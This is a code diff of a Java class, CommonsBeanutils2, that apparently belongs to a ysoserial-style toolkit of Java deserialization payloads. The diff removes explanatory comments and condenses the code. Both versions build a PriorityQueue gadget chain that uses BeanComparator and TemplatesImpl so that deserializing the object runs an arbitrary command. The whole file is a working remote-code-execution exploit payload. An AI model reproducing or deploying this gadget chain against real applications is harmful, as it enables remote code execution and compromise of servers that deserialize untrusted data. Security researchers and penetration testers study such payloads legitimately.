@@ -12,23 +12,15 @@ import java.util.PriorityQueue;
 public class CommonsBeanutils2 implements ObjectPayload<Object> {
 
 	public Object getObject(final String command) throws Exception {
-		final Object template = Gadgets.createTemplatesImpl(command);
-		// mock method name until armed
+		final Object         template   = Gadgets.createTemplatesImpl(command);
 		final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
 
-		// create queue with numbers and basic comparator
 		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
-		// stub data for replacement later
 		queue.add("1");
 		queue.add("1");
 
-		// switch method called by comparator
 		Reflections.setFieldValue(comparator, "property", "outputProperties");
-
-		// switch contents of queue
-		final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
-		queueArray[0] = template;
-		queueArray[1] = template;
+		Reflections.setFieldValue(queue, "queue", new Object[]{template, template});
 
 		return queue;
 	}
